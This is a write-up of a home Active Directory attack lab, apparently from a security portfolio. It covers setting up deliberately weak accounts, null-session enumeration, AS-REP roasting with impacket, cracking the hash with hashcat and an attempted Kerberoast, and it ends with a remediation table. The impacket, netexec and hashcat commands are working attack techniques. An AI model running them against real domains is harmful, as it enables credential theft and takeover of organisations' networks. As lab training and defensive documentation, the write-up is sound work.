# Methodology & Attack Chain — AD Attack Lab

## 1. Lab Build

### 1.1 Domain Controller (DC01 — Windows Server 2019)
- Assigned static IP `192.168.56.10` via PowerShell:
  ```powershell
  New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.56.10 -PrefixLength 24 -DefaultGateway 192.168.56.1
  Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.56.10
  ```
- Installed AD DS role, promoted to Domain Controller, created new forest `vulncorp.local`.

**Screenshot:** `screenshots/01-ad-object-creation/01-domain-overview-getaddomain.png`

### 1.2 Vulnerable Domain Objects

Kerberoastable service account:
```powershell
New-ADUser -Name "svc-sql" -SamAccountName "svc-sql" `
  -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) -Enabled $true
setspn -A MSSQLSvc/dc01.vulncorp.local:1433 svc-sql
```

AS-REP roastable user (Kerberos preauth disabled):
```powershell
New-ADUser -Name "Y.Borde" -SamAccountName "Y.Borde" `
  -AccountPassword (ConvertTo-SecureString "Yash@04" -AsPlainText -Force) -Enabled $true
Set-ADAccountControl -Identity "Y.Borde" -DoesNotRequirePreAuth $true
```

Domain Admin account (reused as local admin on WIN7 — simulates real-world privilege reuse):
```powershell
New-ADUser -Name "admin-svc" -SamAccountName "admin-svc" `
  -AccountPassword (ConvertTo-SecureString "Adm1nP@ss" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members "admin-svc"
```

**Screenshots:** `screenshots/01-ad-object-creation/02-*.png` through `04-*.png`

### 1.3 Domain Join & Networking
- Joined WIN7 (`YASH-PC`) to `vulncorp.local`, static IP `192.168.56.20`, DNS pointed at DC01.
- Added `admin-svc` to WIN7's local Administrators group to simulate shared privileged access.
- Troubleshot and resolved a VirtualBox Internal Network adapter fault (`Media State: Media disconnected`) that initially blocked WIN7 connectivity.
- Configured Kali attack box with static IP `192.168.56.30`, DNS pointed at DC01.

**Screenshots:** `screenshots/02-domain-join-networking/`

---

## 2. Reconnaissance & Enumeration

### 2.1 Port Scan (DC01)
```bash
sudo nmap -sV -sC -p- 192.168.56.10 -oN dc01_scan.txt
```
Confirmed standard DC services: Kerberos (88), LDAP (389/636), SMB (445), Global Catalog (3268/3269), SMB signing enabled and required.

**Screenshot:** `screenshots/03-recon-enumeration/01-nmap-full-port-scan-dc01.png`

### 2.2 SMB / Null Session Enumeration
```bash
netexec smb 192.168.56.10
enum4linux-ng -A 192.168.56.10
```

**Finding:** DC01 allows SMB null sessions (`Server 192.168.56.10 allows sessions using username '', password ''`). This permits unauthenticated enumeration of users, shares, and RID cycling without any credentials — a legitimate, reportable finding independent of lab context.

**Screenshots:** `screenshots/03-recon-enumeration/02-*.png`, `03-*.png`

---

## 3. AS-REP Roasting

Target: `Y.Borde` (Kerberos preauthentication disabled).

```bash
echo -e "svc-sql\nY.Borde\nadmin-svc" > usernames.txt
impacket-GetNPUsers vulncorp.local/ -usersfile usernames.txt -no-pass \
  -dc-ip 192.168.56.10 -format hashcat -outputfile asrep_hashes.txt
```

Result: `svc-sql` and `admin-svc` correctly rejected (preauth required). `Y.Borde` returned a crackable `$krb5asrep$23$...` hash.

**Screenshots:** `screenshots/04-as-rep-roasting/`

---

## 4. Offline Hash Cracking

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Result:** Cracked in under 1 second — `Y.Borde : Yash@04` was present in the rockyou.txt corpus despite containing uppercase, lowercase, a number, and a symbol.

**Finding:** Demonstrates that password complexity requirements alone (mixed case + number + symbol) do not guarantee resistance to dictionary attacks if the resulting password pattern has appeared in prior breach corpora.

**Screenshot:** `screenshots/05-hash-cracking/01-hashcat-asrep-cracked-yborde.png`

---

## 5. Kerberoasting (In Progress)

Target: `svc-sql` (registered SPN `MSSQLSvc/dc01.vulncorp.local:1433`).

```bash
impacket-GetUserSPNs vulncorp.local/Y.Borde:'Yash@04' -dc-ip 192.168.56.10 \
  -request -outputfile kerberoast_hashes.txt
```

**Blocker:** `KRB_AP_ERR_SKEW (Clock skew too great)`. Root cause identified as VirtualBox Guest Additions' automatic host-time synchronization silently overriding manual `date -s` changes on the Kali attack box, even after disabling `systemd-timesyncd`.

**Fix identified (untested at time of writing):**
```bash
# Run on the HOST machine, VM powered off
VBoxManage setextradata "Kali" "VBoxInternal/Devices/VMMDev/0/Config/GetHostTimeDisabled" 1
```

**Screenshot:** `screenshots/06-kerberoasting/01-dc01-clock-skew-troubleshooting.png`

---

## 6. Lateral Movement (Planned)

- Map attack paths from `Y.Borde` → `admin-svc` → Domain Admin using BloodHound / SharpHound.
- Attempt pass-the-hash / credential reuse from WIN7 to DC01 using `admin-svc`.
- Document full compromise path: initial foothold → AS-REP Roast → Kerberoast → lateral movement → Domain Admin.

---

## Remediation Summary

| Finding | Remediation |
|---|---|
| SMB null sessions allowed | Disable anonymous SAM enumeration (`RestrictAnonymous` registry policy) |
| AS-REP roastable account | Re-enable Kerberos preauthentication for all standard users |
| Weak/breach-corpus password | Enforce passphrase-based policy; screen against breached-password lists (e.g., Have I Been Pwned API / Azure AD Password Protection) |
| Kerberoastable service account | Use Group Managed Service Accounts (gMSA) with randomized, non-crackable passwords |
| Privileged account reuse across hosts | Enforce tiered administration model (Tier 0/1/2); unique local admin credentials per host (LAPS) |
